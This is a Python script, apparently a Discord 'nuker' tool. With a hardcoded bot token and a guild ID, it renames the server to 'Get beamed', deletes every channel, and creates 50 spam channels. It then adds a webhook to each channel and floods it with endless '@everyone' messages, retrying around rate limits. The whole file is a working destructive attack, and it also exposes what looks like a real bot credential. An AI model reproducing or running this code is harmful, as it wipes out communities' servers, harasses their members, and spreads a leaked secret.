import aiohttp
import asyncio

BOT_TOKEN = "MTMyODc5NDgxNDM2MzIwOTg0OA.GoqbJq.mbiJFBf25Jp2vOCQtZntmDNbTKnb-p4Cn4Pwsg"
GUILD_ID = "1354915112590381101"
HEADERS = {
    "Authorization": f"Bot {BOT_TOKEN}",
    "Content-Type": "application/json"
}

CHANNELS_URL = f"https://discord.com/api/v10/guilds/{GUILD_ID}/channels"
GUILD_URL = f"https://discord.com/api/v10/guilds/{GUILD_ID}"

async def change_server_name(session):
    data = {"name": "Get beamed"}
    async with session.patch(GUILD_URL, headers=HEADERS, json=data) as response:
        if response.status == 200:
            print("Server name changed to 'Get beamed'")

async def fetch_channels(session):
    async with session.get(CHANNELS_URL, headers=HEADERS) as response:
        return await response.json() if response.status == 200 else []

async def delete_channel(session, channel_id):
    async with session.delete(f"https://discord.com/api/v10/channels/{channel_id}", headers=HEADERS) as response:
        if response.status == 204:
            print(f"Deleted channel: {channel_id}")
        elif response.status == 429:
            retry_after = (await response.json()).get("retry_after", 1)
            await asyncio.sleep(retry_after)
            return await delete_channel(session, channel_id)

async def create_channel(session, i):
    data = {"name": f"lol", "type": 0}
    async with session.post(CHANNELS_URL, headers=HEADERS, json=data) as response:
        if response.status == 201:
            channel = await response.json()
            print(f"Created channel: {channel['id']}")
            return channel["id"]
        elif response.status == 429:
            retry_after = (await response.json()).get("retry_after", 1)
            await asyncio.sleep(retry_after)
            return await create_channel(session, i)

async def create_webhook(session, channel_id):
    url = f"https://discord.com/api/v10/channels/{channel_id}/webhooks"
    data = {"name": f"webhook-for-{channel_id}"}
    print(f"Attempting to create webhook for channel {channel_id}...")
    async with session.post(url, headers=HEADERS, json=data) as response:
        if response.status == 201:
            webhook = await response.json()
            print(f"Created webhook for channel {channel_id} with URL: {webhook['url']}")
            return webhook["url"]
        elif response.status == 429:
            retry_after = (await response.json()).get("retry_after", 1)
            await asyncio.sleep(retry_after)
            return await create_webhook(session, channel_id)
        else:
            print(f"Failed to create webhook for channel {channel_id}, Status: {response.status}")

async def send_webhook_message(session, webhook_url):
    if not webhook_url:
        return
    while True:
        async with session.post(webhook_url, json={"content": "@everyone hello"}) as response:
            if response.status == 204:
                print(f"Message sent via webhook: {webhook_url}")
            elif response.status == 429:
                retry_after = (await response.json()).get("retry_after", 1)
                await asyncio.sleep(retry_after)
                continue
        await asyncio.sleep(0,1)

async def main():
    async with aiohttp.ClientSession() as session:
        await change_server_name(session)
        channels = await fetch_channels(session)
        await asyncio.gather(*(delete_channel(session, ch["id"]) for ch in channels))
        created_channels = await asyncio.gather(*(create_channel(session, i) for i in range(1, 51)))
        created_channels = [ch for ch in created_channels if ch]
        webhooks = await asyncio.gather(*(create_webhook(session, ch) for ch in created_channels))
        for webhook_url in [wh for wh in webhooks if wh]:
            asyncio.create_task(send_webhook_message(session, webhook_url))

asyncio.run(main())